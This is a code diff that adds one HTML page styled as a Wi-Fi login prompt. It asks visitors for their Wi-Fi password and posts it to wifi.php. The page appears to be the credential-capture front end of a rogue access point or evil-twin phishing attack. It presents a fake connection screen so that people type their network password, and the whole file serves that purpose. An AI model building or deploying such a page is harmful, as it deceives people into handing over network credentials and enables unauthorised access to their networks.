@@ -1,0 +1,98 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Connect to WiFi!</title>
+</head>
+
+<style>
+
+    *{
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+        font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+    }
+
+    html {
+        font-size: 62.5%;
+    }
+
+    body {
+        width: 100%;
+        height: 100vh;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+    }
+
+    #main, form {
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        flex-direction: column;
+    }
+
+    #main {
+        width: 30rem;
+        height: 30.5rem;
+        box-shadow: 0px 0px 10px 5px grey;
+        border-radius: 5px;
+        gap: 20px;
+    }
+
+    img {
+        width: 100px;
+    }
+
+    h3 {
+        font-size: 20px;
+        text-align: center;
+    }
+
+    form {
+        width: 100%;
+    }
+
+    input {
+        font-weight: 500;
+        font-size: 15px;
+        border-radius: 5px;
+        outline: none;
+        border: 2px solid black;
+        padding: 7px;
+        width: 80%;
+    }
+
+    button {
+        width: 50%;
+        padding: 6px;
+        font-size: 15px;
+        font-weight: 700;
+        background-color: rgb(4, 245, 129);
+        border: none;
+        outline: none;
+        border-radius: 5px;
+        cursor: pointer;
+        margin: 2px;
+    }
+
+  
+</style>
+
+<body>
+    
+    <div id="main">
+        <img src="img/wifi.png" alt="Wifi" />
+        <h3>Enter your WiFI password to connect!</h3>
+        <form action="wifi.php" method="post">
+            <input type="password" placeholder="Enter Your Wi-fi Password" name="pass" required />
+            <br>
+            <button>Submit</button>
+        </form>
+    </div>
+
+</body>
+</html>
